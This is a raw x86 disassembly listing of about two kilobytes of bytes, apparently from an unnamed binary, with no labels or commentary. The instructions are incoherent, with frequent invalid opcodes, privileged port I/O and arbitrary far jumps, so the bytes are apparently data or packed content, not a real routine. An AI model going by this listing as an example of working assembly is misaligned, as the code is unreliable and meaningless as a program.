  44d7f5:	bound  ebp,QWORD PTR [edx+0x5b]
  44d7f8:	xchg   edx,eax
  44d7f9:	pop    edx
  44d7fa:	rcl    BYTE PTR [eax+esi*2-0x52f5f288],cl
  44d801:	mov    ds:0x8ec8e83,al
  44d806:	pushf  
  44d807:	mov    ah,0xcf
  44d809:	xor    bh,BYTE PTR [esi]
  44d80b:	mov    BYTE PTR [edx-0x73],bh
  44d80e:	out    dx,al
  44d80f:	mov    esi,0x475b4ead
  44d814:	imul   edx,DWORD PTR [edx-0x5e],0xfffffff4
  44d818:	or     eax,0x87ac8e18
  44d81d:	sub    eax,0x83052359
  44d822:	adc    DWORD PTR [edi],0xc1f41e08
  44d828:	xor    BYTE PTR [edx-0x75],bl
  44d82b:	sub    BYTE PTR [esi-0x10],0xb7
  44d82f:	pop    edi
  44d830:	je     0x44d89f
  44d832:	jmp    0x245e:0x7bbf5ca5
  44d839:	xor    BYTE PTR [edx],cl
  44d83b:	into   
  44d83c:	add    dh,ah
  44d83e:	div    cl
  44d840:	push   edi
  44d841:	xchg   esi,eax
  44d842:	lock adc BYTE PTR [eax+0x7cf2df17],dh
  44d849:	xor    al,0x60
  44d84b:	(bad)  
  44d84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d84d:	sti    
  44d84e:	inc    edx
  44d84f:	mov    edi,0xe90a5ef8
  44d854:	enter  0x6eaa,0x28
  44d858:	test   al,0xae
  44d85a:	or     al,BYTE PTR ds:0xcda905c2
  44d860:	adc    al,0x21
  44d862:	fdivr  QWORD PTR [ecx]
  44d864:	ss or  al,0x34
  44d867:	or     al,0xd4
  44d869:	sub    al,BYTE PTR [esi+ebx*1-0x1259b2a6]
  44d870:	cmp    BYTE PTR ds:0x4191e28d,bh
  44d876:	mov    esp,0xa54533c
  44d87b:	aas    
  44d87c:	pusha  
  44d87d:	out    dx,al
  44d87e:	mov    eax,edx
  44d880:	inc    edi
  44d881:	mov    ds:0x5b6aee21,al
  44d886:	pop    esi
  44d887:	sbb    eax,0x7e0bcd05
  44d88c:	popa   
  44d88d:	push   ss
  44d88e:	add    BYTE PTR [esp+eiz*4+0x4e],ah
  44d892:	dec    esi
  44d893:	mov    ds:0xa1a82b99,al
  44d898:	test   al,0x96
  44d89a:	mov    edx,0x58e16696
  44d89f:	lock or DWORD PTR [ecx],edx
  44d8a2:	dec    edx
  44d8a3:	in     eax,dx
  44d8a4:	dec    esi
  44d8a5:	pop    edi
  44d8a6:	sbb    al,0xc2
  44d8a8:	rol    BYTE PTR [ebx-0x7e],0xee
  44d8ac:	test   BYTE PTR [ebp+0x41],ch
  44d8af:	cld    
  44d8b0:	adc    dh,cl
  44d8b2:	sbb    al,0x56
  44d8b4:	sub    al,0x1a
  44d8b6:	add    al,0xac
  44d8b8:	fs or  ebp,ebp
  44d8bb:	and    eax,DWORD PTR [eax]
  44d8bd:	push   0xb0888e5a
  44d8c2:	sbb    DWORD PTR [eax],esp
  44d8c4:	sti    
  44d8c5:	pop    eax
  44d8c6:	jnp    0x44d8a2
  44d8c8:	sbb    al,0xc6
  44d8ca:	retf   0x3c58
  44d8cd:	je     0x44d8e7
  44d8cf:	cmp    dh,BYTE PTR [esi+esi*8+0xdd74fa]
  44d8d6:	xchg   esp,eax
  44d8d7:	adc    dh,BYTE PTR [eax+0x30]
  44d8da:	jl     0x44d89f
  44d8dc:	clc    
  44d8dd:	add    DWORD PTR [eax+0x68928b8a],ebp
  44d8e3:	icebp  
  44d8e4:	ror    DWORD PTR [ecx-0x6be3903c],0xd9
  44d8eb:	scas   al,BYTE PTR es:[edi]
  44d8ec:	push   ds
  44d8ed:	inc    ecx
  44d8ee:	fwait
  44d8ef:	ret    0x1ec6
  44d8f2:	lods   al,BYTE PTR ds:[esi]
  44d8f3:	and    cl,BYTE PTR [ebp-0x29e70ef9]
  44d8f9:	and    eax,DWORD PTR [edx+0x69]
  44d8fc:	inc    esp
  44d8fd:	mov    WORD PTR [eax-0x38ff2dab],?
  44d903:	adc    BYTE PTR [eax+0x1c],dh
  44d906:	pop    esi
  44d907:	sub    ch,0x51
  44d90a:	test   DWORD PTR [edx-0x15],ebp
  44d90d:	dec    eax
  44d90e:	(bad)  
  44d90f:	mov    BYTE PTR [ebp+ecx*2+0x1d76240],al
  44d916:	cmp    al,0x65
  44d918:	(bad)  
  44d919:	clc    
  44d91a:	das    
  44d91b:	ss sbb al,0x53
  44d91e:	das    
  44d91f:	mov    ch,ah
  44d921:	cmp    ebx,DWORD PTR [esi+esi*4+0x26]
  44d925:	(bad)  
  44d926:	aas    
  44d927:	add    al,0xf1
  44d929:	push   edx
  44d92a:	add    dl,al
  44d92c:	retf   0x3611
  44d92f:	mov    BYTE PTR ds:0xfc45205f,al
  44d935:	int    0xb7
  44d937:	or     ebx,DWORD PTR [esi-0xaf702e0]
  44d93d:	mov    ebx,0x80960e6e
  44d942:	mov    WORD PTR [ebx+0x70],ds
  44d945:	sub    eax,0xf6b95211
  44d94a:	mov    bl,0xf0
  44d94c:	mov    ?,WORD PTR ds:0x52250ab6
  44d952:	sar    DWORD PTR [esi+edi*2+0x74],0xb2
  44d957:	push   esi
  44d958:	or     esp,DWORD PTR [ebx]
  44d95a:	repnz sbb ch,ah
  44d95d:	hlt    
  44d95e:	loop   0x44d905
  44d960:	test   al,0x97
  44d962:	add    BYTE PTR [edi-0x58f3f530],ah
  44d968:	adc    esp,0xfffffff4
  44d96b:	dec    eax
  44d96c:	adc    al,0xae
  44d96e:	mov    gs,WORD PTR [edi]
  44d970:	jp     0x44d9c2
  44d972:	or     ebx,edx
  44d974:	sub    cl,ah
  44d976:	lds    edi,FWORD PTR [edx+0x46]
  44d979:	push   ds
  44d97a:	mov    esi,0x904f034f
  44d97f:	jmp    0x5a1e:0xb2173403
  44d986:	je     0x44d977
  44d988:	push   ss
  44d989:	ret    0x8441
  44d98c:	inc    ax
  44d98e:	xor    BYTE PTR [eax],0xc
  44d991:	(bad)  
  44d992:	jecxz  0x44d99d
  44d994:	lods   al,BYTE PTR ds:[esi]
  44d995:	cmp    BYTE PTR [esi+0x69340a1a],dh
  44d99b:	fadd   QWORD PTR [ecx+0x6d]
  44d99e:	rcl    DWORD PTR [ebx],cl
  44d9a0:	lods   al,BYTE PTR ds:[esi]
  44d9a1:	add    eax,0x76fc50e8
  44d9a6:	jmp    0x1432:0x3c485132
  44d9ad:	loop   0x44d967
  44d9af:	call   0xdc82bb
  44d9b4:	les    ebp,FWORD PTR [esi-0x777ab8a]
  44d9ba:	nop
  44d9bb:	mov    al,0xb9
  44d9bd:	xor    al,BYTE PTR [ecx]
  44d9bf:	add    bl,bl
  44d9c1:	(bad)
  44d9c5:	lock and BYTE PTR [edx+eax*8],dl
  44d9c9:	inc    esi
  44d9ca:	lods   eax,DWORD PTR ds:[esi]
  44d9cb:	mov    edx,0x805023b
  44d9d0:	(bad)  
  44d9d2:	aas    
  44d9d3:	cmp    eax,DWORD PTR [esi+0x62]
  44d9d6:	ins    BYTE PTR es:[edi],dx
  44d9d7:	push   ss
  44d9d8:	cmp    al,0x4b
  44d9da:	shl    BYTE PTR [ebp+0x727bacb2],0xf1
  44d9e1:	xchg   edi,eax
  44d9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d9e3:	xchg   BYTE PTR [edi],dl
  44d9e5:	xchg   esi,eax
  44d9e6:	ds fwait
  44d9e8:	xacquire xchg BYTE PTR [edi+0x1e2b6882],bl
  44d9ef:	mov    WORD PTR [edx+edi*1-0x3b],es
  44d9f3:	push   0xc3f6e904
  44d9f8:	and    bh,BYTE PTR [esi+0x3e]
  44d9fb:	enter  0x8ee0,0x32
  44d9ff:	sti    
  44da00:	sar    BYTE PTR [ebx],1
  44da02:	mov    es,WORD PTR [eax]
  44da04:	mov    ch,0x89
  44da06:	jo     0x44da23
  44da08:	xor    al,0x6a
  44da0a:	pop    edx
  44da0b:	push   esi
  44da0c:	sbb    dh,BYTE PTR [ebx+esi*4]
  44da0f:	jmp    0x44da64
  44da11:	jbe    0x44da0a
  44da13:	dec    edx
  44da14:	push   ebp
  44da15:	int3   
  44da16:	jbe    0x44d9a4
  44da18:	mov    eax,ebx
  44da1a:	adc    al,0x74
  44da1c:	xor    cl,ah
  44da1e:	add    BYTE PTR [edx+0x64295404],cl
  44da24:	mov    ah,0x63
  44da26:	js     0x44d9e3
  44da28:	mov    dl,0x6d
  44da2a:	sbb    BYTE PTR [edx+ecx*1-0x490b52e6],cl
  44da31:	jl     0x44da0f
  44da33:	sub    al,0xb0
  44da35:	add    BYTE PTR [bp+di+0x724c],cl
  44da3a:	or     dh,BYTE PTR [ebp+esi*1-0x1]
  44da3e:	push   0xaac058e8
  44da43:	icebp  
  44da44:	cld    
  44da45:	jmp    0xc44ac07d
  44da4a:	dec    edi
  44da4b:	or     ebp,ebp
  44da4d:	loopne 0x44da7b
  44da4f:	mov    BYTE PTR [ebx-0x2c],dh
  44da52:	fimul  DWORD PTR [edx+0x13]
  44da55:	adc    bh,BYTE PTR [esi+0x5b]
  44da58:	push   0xffffffb7
  44da5a:	ins    DWORD PTR es:[edi],dx
  44da5b:	mov    ds:0x12f516bd,al
  44da60:	push   esp
  44da61:	pop    ss
  44da62:	jle    0x44da12
  44da64:	mov    WORD PTR [eax],gs
  44da66:	in     al,0x63
  44da68:	push   edx
  44da69:	vpmacssdql xmm9,xmm0,XMMWORD PTR [edx],xmm2
  44da6f:	pop    ebx
  44da70:	push   es
  44da71:	fisubr DWORD PTR [esi+0x2570c8aa]
  44da77:	les    ebx,FWORD PTR [edi]
  44da79:	test   DWORD PTR [edi+0x4784f0b0],eax
  44da7f:	mov    ds:0x2b60f164,al
  44da84:	mov    ds:0x1d9031e9,al
  44da89:	idiv   BYTE PTR [eax+esi*2-0x28]
  44da8d:	test   edi,edx
  44da8f:	mov    dh,0xb6
  44da91:	int    0xa0
  44da93:	xchg   esp,eax
  44da94:	retf   
  44da95:	test   al,0xc5
  44da97:	out    0x6b,al
  44da99:	push   ebp
  44da9a:	mov    eax,0x82776082
  44da9f:	add    cl,dl
  44daa1:	loop   0x44da37
  44daa3:	imul   ebp,ebp,0xffffff8a
  44daa6:	inc    eax
  44daa7:	mov    dh,BYTE PTR [eax-0x7f]
  44daaa:	lods   al,BYTE PTR ds:[esi]
  44daab:	outs   dx,BYTE PTR ds:[esi]
  44daac:	out    dx,al
  44daad:	sbb    DWORD PTR [esp+ecx*2],esi
  44dab0:	mov    eax,ds:0xee08409b
  44dab5:	mov    esi,DWORD PTR [ecx+esi*8]
  44dab8:	sar    edx,cl
  44daba:	sbb    BYTE PTR es:[eax+0x5c],dl
  44dabe:	inc    esi
  44dabf:	push   0x9780af45
  44dac4:	or     bl,bh
  44dac6:	pop    edx
  44dac7:	adc    al,0x5
  44dac9:	daa    
  44daca:	dec    edx
  44dacb:	sub    edx,DWORD PTR [esi]
  44dacd:	shl    BYTE PTR [edi],cl
  44dacf:	adc    DWORD PTR [esi],edx
  44dad1:	mov    esi,0x84a7220c
  44dad6:	and    ch,BYTE PTR [esi+0x3458aafc]
  44dadc:	adc    esp,DWORD PTR [ecx-0x4bd7a9a1]
  44dae2:	icebp  
  44dae3:	adc    eax,0xb83569a
  44dae8:	ret    0xfa9b
  44daeb:	out    0x99,al
  44daed:	mov    eax,ds:0x90205094
  44daf2:	mov    edx,0x871b4e48
  44daf7:	nop
  44daf8:	mov    ch,BYTE PTR [edx-0x1e]
  44dafb:	stos   BYTE PTR es:[edi],al
  44dafc:	mov    ds:0x326d051f,al
  44db01:	sub    BYTE PTR [eax],0xc
  44db04:	(bad)  
  44db05:	lods   al,BYTE PTR ds:[esi]
  44db06:	imul   BYTE PTR [eax]
  44db08:	xchg   esi,eax
  44db09:	mov    al,0x3e
  44db0b:	add    dh,BYTE PTR [edx]
  44db0d:	push   ecx
  44db0e:	sbb    edx,esp
  44db10:	add    al,0xba
  44db12:	sar    BYTE PTR [esi],1
  44db14:	jmp    0x6403:0x6c9046c
  44db1b:	sub    esp,ebp
  44db1d:	add    DWORD PTR [eax-0x97335d9],ecx
  44db23:	dec    ecx
  44db24:	(bad)  
  44db25:	test   BYTE PTR [edx],0x1b
  44db28:	lods   al,BYTE PTR ds:[esi]
  44db29:	lods   eax,DWORD PTR ds:[esi]
  44db2a:	std    
  44db2b:	ins    BYTE PTR es:[edi],dx
  44db2c:	sub    BYTE PTR [ebp+0xa92cc0a],ch
  44db32:	mov    al,0x6
  44db34:	mov    dl,0xa4
  44db36:	(bad)  
  44db37:	sub    edx,DWORD PTR [eax+0x6f36d0d4]
  44db3d:	and    DWORD PTR es:[eax-0x60],0xffffffb8
  44db42:	cs leave 
  44db44:	or     ah,BYTE PTR ds:0xec0a8d76
  44db4a:	inc    esp
  44db4b:	imul   edx,DWORD PTR [ebx],0x43f4ee43
  44db51:	scas   eax,DWORD PTR es:[edi]
  44db52:	nop
  44db53:	icebp  
  44db54:	ret    
  44db55:	clc    
  44db56:	js     0x44dbc3
  44db58:	scas   al,BYTE PTR es:[edi]
  44db59:	mov    esp,0x17e0026b
  44db5e:	add    BYTE PTR [eax+ebx*4],bh
  44db61:	sahf   
  44db62:	stc    
  44db63:	div    BYTE PTR [esi+0x4135b6d0]
  44db69:	add    ebx,DWORD PTR [eax+0x3fbe9398]
  44db6f:	jnp    0x44db9f
  44db71:	and    eax,0xc1a033e2
  44db76:	call   0xad5719fe
  44db7b:	jns    0x44db78
  44db7d:	push   cs
  44db7e:	enter  0x8ed6,0x51
  44db82:	add    BYTE PTR [esi],dh
  44db84:	sub    DWORD PTR [ebx],ebp
  44db86:	mov    esi,0x4fc4d6d
  44db8b:	jle    0x44dbd3
  44db8d:	loop   0x44dbc5
  44db8f:	rcr    BYTE PTR [ecx],cl
  44db91:	sub    bl,BYTE PTR [edi+0x817e065]
  44db97:	push   es
  44db98:	xor    BYTE PTR [edx],0x1e
  44db9b:	push   esp
  44db9c:	retf   
  44db9d:	clc    
  44db9e:	imul   ecx,DWORD PTR [ebx],0xc72edf6a
  44dba4:	push   0x347e5c76
  44dba9:	test   BYTE PTR [eiz*8-0x1c9cdde8],dh
  44dbb0:	adc    eax,0x11fa6c08
  44dbb5:	mov    esp,0x26f8a0bc
  44dbba:	sub    ch,BYTE PTR [ebx+ebp*1-0x3a97f08]
  44dbc1:	(bad)  
  44dbc2:	call   0x105c:0xe4141748
  44dbc9:	shl    BYTE PTR [edx],cl
  44dbcb:	sti    
  44dbcc:	hlt    
  44dbcd:	xchg   edx,eax
  44dbce:	xor    BYTE PTR [esi],ah
  44dbd0:	mov    dh,0x11
  44dbd2:	pop    esi
  44dbd3:	add    eax,0x23edb465
  44dbd8:	dec    eax
  44dbd9:	lods   al,BYTE PTR ds:[esi]
  44dbda:	fs cmc 
  44dbdc:	or     ebp,DWORD PTR [esi+0x6c4086d5]
  44dbe2:	ret    0x2b8e
  44dbe5:	or     ah,BYTE PTR [ecx+edx*8]
  44dbe8:	nop
  44dbe9:	add    dh,BYTE PTR [edi-0x3f0f79fa]
  44dbef:	or     BYTE PTR [ebx+0x16bad8da],ah
  44dbf5:	mov    DWORD PTR [ebx],ebp
  44dbf7:	cwde   
  44dbf8:	add    BYTE PTR [ecx+eiz*4],bh
  44dbfb:	xor    ch,dh
  44dbfd:	sub    BYTE PTR [edx+ecx*1],dl
  44dc00:	pushf  
  44dc01:	retf   0x6442
  44dc04:	push   0xe16dd05a
  44dc09:	push   edx
  44dc0a:	sbb    BYTE PTR [edx+esi*1-0x502b2dcf],dl
  44dc11:	xchg   ebp,eax
  44dc12:	adc    BYTE PTR [edx+0x4c2e5d96],0x6d
  44dc19:	mul    BYTE PTR [edx+0x38]
  44dc1c:	push   0xffffffb8
  44dc1e:	cs popa 
  44dc20:	xchg   ebp,eax
  44dc21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dc22:	jnp    0x44dc68
  44dc24:	lds    esp,FWORD PTR [esi-0x75]
  44dc27:	cmp    BYTE PTR [edi-0x5f53bfc],ch
  44dc2d:	xor    al,0x58
  44dc2f:	dec    esi
  44dc30:	call   0x843d:0x541f0355
  44dc37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dc38:	jl     0x44dc04
  44dc3a:	jl     0x44dc74
  44dc3c:	inc    eax
  44dc3d:	sub    BYTE PTR [esi-0x2fc5d908],ah
  44dc43:	and    DWORD PTR [ebp+edx*8+0x50207de0],esp
  44dc4a:	imul   edx,DWORD PTR [eax+0x45],0xffffff87
  44dc4e:	ret    0x5aba
  44dc51:	fist   WORD PTR [esi]
  44dc53:	push   edi
  44dc54:	add    al,BYTE PTR [edi+edx*1-0x117d33d6]
  44dc5b:	icebp  
  44dc5c:	ror    BYTE PTR [ebx],0xbf
  44dc5f:	dec    eax
  44dc60:	jl     0x44dc02
  44dc62:	(bad)  
  44dc63:	ins    DWORD PTR es:[edi],dx
  44dc64:	inc    eax
  44dc65:	or     eax,0xa1aa8607
  44dc6a:	sub    edx,DWORD PTR [eax-0x3b]
  44dc6d:	xchg   edx,eax
  44dc6e:	push   esi
  44dc6f:	inc    ecx
  44dc70:	bound  eax,QWORD PTR [ecx-0x45]
  44dc73:	mov    eax,gs
  44dc75:	push   edx
  44dc76:	mov    edx,0x40bdf28a
  44dc7b:	xchg   ebp,eax
  44dc7c:	gs (bad) 
  44dc7e:	cmp    al,0xc1
  44dc80:	xor    DWORD PTR [esi+ebp*1],eax
  44dc83:	sub    BYTE PTR ds:0x26076f00,dh
  44dc89:	add    eax,DWORD PTR [eax+0x31]
  44dc8c:	js     0x44dc8e
  44dc8e:	shr    DWORD PTR [esi],cl
  44dc90:	call   0x4d6425c0
  44dc95:	jmp    0x2aa6:0xea69
  44dc9b:	or     DWORD PTR [edx-0x2fddfb18],0xa605b0dc
  44dca5:	(bad)  
  44dca6:	dec    eax
  44dca7:	in     al,0x1d
  44dca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dcaa:	sbb    dh,bl
  44dcac:	aam    0x8e
  44dcae:	mov    dh,0xda
  44dcb0:	fwait
  44dcb1:	shl    BYTE PTR [esi+eax*2-0x28ff9e26],1
  44dcb8:	retf   0x4893
  44dcbb:	(bad)  
  44dcbd:	pop    esp
  44dcbe:	or     dl,BYTE PTR [edx+0x7]
  44dcc1:	lods   al,BYTE PTR ds:[esi]
  44dcc2:	pop    eax
  44dcc3:	lods   al,BYTE PTR ds:[esi]
  44dcc4:	and    dl,BYTE PTR [ebx-0x61]
  44dcc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44dcc8:	sub    bl,BYTE PTR [edx]
  44dcca:	stos   BYTE PTR es:[edi],al
  44dccb:	mov    WORD PTR [esi+eiz*1+0x451ab068],es
  44dcd2:	cmp    al,0x42
  44dcd4:	xchg   esp,eax
  44dcd5:	ins    BYTE PTR es:[edi],dx
  44dcd6:	fcom   QWORD PTR [edx+0x7785a276]
  44dcdc:	stos   DWORD PTR es:[edi],eax
  44dcdd:	xor    eax,0x61f158ec
  44dce2:	jge    0x44dccc
  44dce4:	push   ebp
  44dce5:	(bad)  [eax+ebp*8+0x4]
  44dce9:	pop    ebx
  44dcea:	rcr    bl,1
  44dcec:	mov    bl,0xf4
  44dcee:	shr    dl,1
  44dcf0:	jno    0x44dcfd
  44dcf2:	xchg   edx,eax
  44dcf3:	pop    esp
  44dcf4:	fs cwde 
  44dcf6:	ret    
  44dcf7:	mov    bh,BYTE PTR [eax+0x64]
  44dcfa:	add    DWORD PTR [eax],esp
  44dcfc:	hlt    
  44dcfd:	xor    BYTE PTR [edx],al
  44dcff:	(bad)  
  44dd00:	mov    dl,0x5e
  44dd02:	enter  0x13b5,0x6a
  44dd06:	push   ebp
  44dd07:	fmul   DWORD PTR [esi+0x64b63509]
  44dd0d:	ror    BYTE PTR [eax+0x40],0x77
  44dd11:	jmp    0x44dd51
  44dd13:	add    BYTE PTR [edi+eax*8+0x58],ch
  44dd17:	data16 mov es,WORD PTR [ecx+0x5096bc]
  44dd1e:	jle    0x44dd78
  44dd20:	sbb    edx,DWORD PTR [eax+0x28]
  44dd23:	iret   
  44dd24:	pop    esi
  44dd25:	pusha  
  44dd26:	push   cs
  44dd27:	fdiv   DWORD PTR [eax+0x49]
  44dd2a:	std    
  44dd2b:	inc    esp
  44dd2c:	mov    bl,0xa
  44dd2e:	push   ss
  44dd2f:	inc    ebp
  44dd30:	je     0x44dcd0
  44dd32:	sbb    dl,BYTE PTR [edi-0x5c]
  44dd35:	sbb    BYTE PTR ds:[eax],cl
  44dd38:	jle    0x44dd47
  44dd3a:	mov    eax,0x5201a17b
  44dd3f:	xchg   DWORD PTR [ecx+edi*1+0x3ccd4e9e],esp
  44dd46:	inc    eax
  44dd47:	jp     0x44dd4d
  44dd49:	lods   al,BYTE PTR ds:[esi]
  44dd4a:	repnz mov BYTE PTR [edx],ch
  44dd4d:	scas   al,BYTE PTR es:[edi]
  44dd4e:	inc    ebp
  44dd4f:	pop    ss
  44dd50:	mov    dh,0x56
  44dd52:	(bad)  
  44dd53:	mov    ecx,DWORD PTR [edx+0x7e]
  44dd56:	and    BYTE PTR [eax+ecx*1],dl
  44dd59:	bound  ebp,QWORD PTR [ebx]
  44dd5b:	adc    BYTE PTR [ebx],dl
  44dd5d:	push   ds
  44dd5e:	pusha  
  44dd5f:	les    esi,FWORD PTR [esi*1-0x71252dfa]
  44dd66:	or     BYTE PTR [esi-0x73],dl
  44dd69:	and    dl,BYTE PTR [eax-0x4add8736]
  44dd6f:	cmp    eax,0x2794af42
  44dd74:	cmp    al,0x38
  44dd76:	scas   eax,DWORD PTR es:[edi]
  44dd77:	cmp    bl,BYTE PTR [esi]
  44dd79:	or     ah,ch
  44dd7b:	js     0x44dd6e
  44dd7d:	pop    eax
  44dd7e:	add    BYTE PTR [eax-0x4c],dh
  44dd81:	push   esp
  44dd82:	mov    eax,ds:0xe82ea815
  44dd87:	ret    0x969c
  44dd8a:	bswap  edx
  44dd8c:	or     eax,0xe682c12
  44dd91:	mov    dl,0xac
  44dd93:	or     BYTE PTR [esi],al
  44dd95:	pop    ds
  44dd96:	inc    ecx
  44dd97:	jmp    0xf694:0x9155ab60
  44dd9e:	add    al,0x59
  44dda0:	xchg   edx,eax
  44dda1:	(bad)  
  44dda2:	push   0xb4a98678
  44dda7:	repnz fcmovbe st,st(6)
  44ddaa:	adc    bh,BYTE PTR [edi-0x52719300]
  44ddb0:	xchg   esp,eax
  44ddb1:	pop    esi
  44ddb2:	add    cl,BYTE PTR [ebp+0x4071312d]
  44ddb8:	cmp    BYTE PTR cs:[esp+ebp*1],ah
  44ddbc:	jl     0x44ddf2
  44ddbe:	stos   BYTE PTR es:[edi],al
  44ddbf:	aam    0xe
  44ddc1:	xchg   edx,eax
  44ddc2:	popa   
  44ddc3:	jb     0x44ddf3
  44ddc5:	ins    BYTE PTR es:[edi],dx
  44ddc6:	loopne 0x44dd59
  44ddc8:	out    dx,al
  44ddc9:	jb     0x44ddcf
  44ddcb:	dec    edx
  44ddcc:	and    bl,BYTE PTR [edx+0x63]
  44ddcf:	pop    ebx
  44ddd0:	fwait
  44ddd1:	and    ah,0x22
  44ddd4:	leave  
  44ddd5:	clc    
  44ddd6:	adc    BYTE PTR [edi+0x2257a5fb],bl
  44dddc:	jle    0x44dda9
  44ddde:	jmp    0x44dd66
  44dde0:	mov    al,0xef
  44dde2:	adc    BYTE PTR [edx+0x57],bl
  44dde5:	jnp    0x44de37
  44dde7:	pop    ebx
  44dde8:	mov    al,0x88
  44ddea:	inc    esi
  44ddeb:	sbb    eax,0x2a0410fe
  44ddf0:	lods   al,BYTE PTR ds:[esi]
  44ddf1:	xor    bl,BYTE PTR ds:0x62c5f2bb
  44ddf7:	mov    ah,0xd2
  44ddf9:	cmp    al,0x69
  44ddfb:	lods   al,BYTE PTR ds:[esi]
  44ddfc:	mov    ah,0x36
  44ddfe:	popa   
  44ddff:	or     BYTE PTR [esi+ebp*2+0x3f51339f],al
  44de06:	or     edi,0xbabd3150
  44de0c:	pop    ds
  44de0d:	dec    esp
  44de0e:	cmp    ch,BYTE PTR [eax-0x4c]
  44de11:	pop    es
  44de12:	pop    eax
  44de13:	inc    ebp
  44de14:	xor    al,0x21
  44de16:	call   0x58a1:0xeb44f49f
  44de1d:	inc    edi
  44de1e:	fiadd  DWORD PTR [esi+0x2d]
  44de21:	sar    DWORD PTR [esi],1
  44de23:	dec    eax
  44de24:	pop    eax
  44de25:	out    0x23,al
  44de27:	fcomp  st(0)
  44de29:	xchg   esp,eax
  44de2a:	dec    edi
  44de2b:	hlt    
  44de2c:	(bad)  
  44de2d:	lods   eax,DWORD PTR ds:[esi]
  44de2e:	imul   edx,DWORD PTR ds:0x3822a04d,0x838e35e8
  44de38:	jne    0x44ddf2
  44de3a:	jg     0x44de3d
  44de3c:	jecxz  0x44de51
  44de3e:	sbb    BYTE PTR [ebp-0x12],0xef
  44de42:	mov    ecx,0x9f08f084
  44de47:	adc    bh,BYTE PTR [edx-0x4d]
  44de4a:	mov    edx,0xf6adf8d4
  44de4f:	dec    eax
  44de50:	cld    
  44de51:	imul   dh
  44de53:	stos   BYTE PTR es:[edi],al
  44de54:	lock out dx,eax
  44de56:	inc    esi
  44de57:	lahf   
  44de58:	xor    bl,BYTE PTR [ecx]
  44de5a:	lods   eax,DWORD PTR ds:[esi]
  44de5b:	rcr    DWORD PTR [edx-0x4a],0x92
  44de5f:	jbe    0x44ddf5
  44de61:	dec    esi
  44de62:	sbb    bh,BYTE PTR [esi]
  44de64:	pusha  
  44de65:	in     al,dx
  44de66:	fiadd  DWORD PTR [edi+0x5063ba2a]
  44de6c:	push   0xb
  44de6e:	iret   
  44de6f:	inc    esp
  44de70:	add    ebx,DWORD PTR [esi]
  44de72:	ds push cs
  44de74:	shr    edx,1
  44de76:	adc    DWORD PTR [eax+0x44],0xffffff9c
  44de7a:	hlt    
  44de7b:	test   al,0x56
  44de7d:	(bad)  
  44de7e:	hlt    
  44de7f:	mov    edx,edi
  44de81:	dec    ebp
  44de82:	mov    dl,0x30
  44de84:	mov    ?,WORD PTR [edx+0x345bc004]
  44de8a:	jl     0x44de2e
  44de8c:	sbb    al,ch
  44de8e:	dec    ebx
  44de8f:	push   0x879cd728
  44de94:	sbb    edi,eax
  44de96:	or     DWORD PTR [eax],ebx
  44de98:	or     ah,dl
  44de9a:	jmp    FWORD PTR [esi+eiz*2+0x15]
  44de9e:	pop    ebp
  44de9f:	mov    ?,WORD PTR [edi]
  44dea1:	mov    WORD PTR [ebx-0x20],ds
  44dea4:	push   0xffffffcb
  44dea6:	xchg   BYTE PTR [ebp-0x71fb4c3a],bl
  44deac:	or     eax,0x3c563d8a
  44deb1:	sub    DWORD PTR [edx+0x58],0xffffffe3
  44deb5:	sub    al,0x3b
  44deb7:	add    al,0xe7
  44deb9:	or     DWORD PTR [eax+0x60],esi
  44debc:	fisubr WORD PTR [edx]
  44debe:	xor    al,0xae
  44dec0:	xchg   esp,eax
  44dec1:	lahf   
  44dec2:	add    BYTE PTR ds:0xf8ccae60,bl
  44dec8:	and    DWORD PTR [esi+edx*4-0x28],edi
  44decc:	mov    ch,0x1c
  44dece:	(bad)  
  44decf:	mov    esp,esp
  44ded1:	rol    BYTE PTR [ebp+0x136c532f],1
  44ded7:	dec    esi
  44ded8:	push   0x6b
  44deda:	add    DWORD PTR [ebp-0x4012979],0xf8981c01
  44dee4:	dec    ecx
  44dee5:	mov    al,ds:0x7894bc2c
  44deea:	mov    ds:0x464141b1,al
  44deef:	out    0x7a,al
  44def1:	add    al,0x45
  44def3:	jae    0x44de76
  44def5:	clc    
  44def6:	js     0x44df14
  44def8:	scas   al,BYTE PTR es:[edi]
  44def9:	mov    esi,0x7818d06a
  44defe:	inc    ecx
  44deff:	bound  ebp,QWORD PTR [eax-0x1a69577d]
  44df05:	mov    fs,WORD PTR [edi]
  44df07:	lods   al,BYTE PTR ds:[esi]
  44df08:	test   BYTE PTR [esi],0xaf
  44df0b:	mov    BYTE PTR ss:[esi+0x4a039af6],dh
  44df12:	stos   DWORD PTR es:[edi],eax
  44df13:	adc    al,0xb2
  44df15:	not    bh
  44df17:	pushf  
  44df18:	jp     0x44df43
  44df1a:	rcr    DWORD PTR [edx],0xb6
  44df1d:	(bad)  [esi]
  44df1f:	ss repz loopne 0x44df47
  44df23:	jl     0x44df7a
  44df25:	or     eax,0xc9e0d04d
  44df2a:	and    al,0x46
  44df2c:	into   
  44df2d:	repnz stc 
  44df2f:	jb     0x44df49
  44df31:	sahf   
  44df32:	dec    esp
  44df33:	mov    ch,0xd
  44df35:	bound  eax,QWORD PTR [edx+0x7f]
  44df38:	dec    esp
  44df39:	adc    al,0x3a
  44df3b:	mov    ecx,0xdae00464
  44df40:	mov    cs,esi
  44df42:	std    
  44df43:	outs   dx,BYTE PTR ds:[esi]
  44df44:	ins    BYTE PTR es:[edi],dx
  44df45:	dec    ebx
  44df46:	dec    edi
  44df47:	push   esp
  44df48:	xchg   eax,ebx
  44df4a:	test   eax,0xeb2cc230
  44df4f:	lods   eax,DWORD PTR ds:[esi]
  44df50:	add    bl,ah
  44df52:	aas    
  44df53:	in     al,0x2
  44df55:	push   esp
  44df56:	and    edx,ecx
  44df58:	lock sti 
  44df5a:	pop    edx
  44df5b:	xor    BYTE PTR [ebp-0x7d17521a],cl
  44df61:	jo     0x44df95
  44df63:	shr    DWORD PTR [esi],cl
  44df65:	push   ebp
  44df66:	cmp    eax,DWORD PTR [eax]
  44df68:	shl    DWORD PTR [eax-0x2fdb3850],cl
  44df6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44df6f:	xlat   BYTE PTR ds:[ebx]
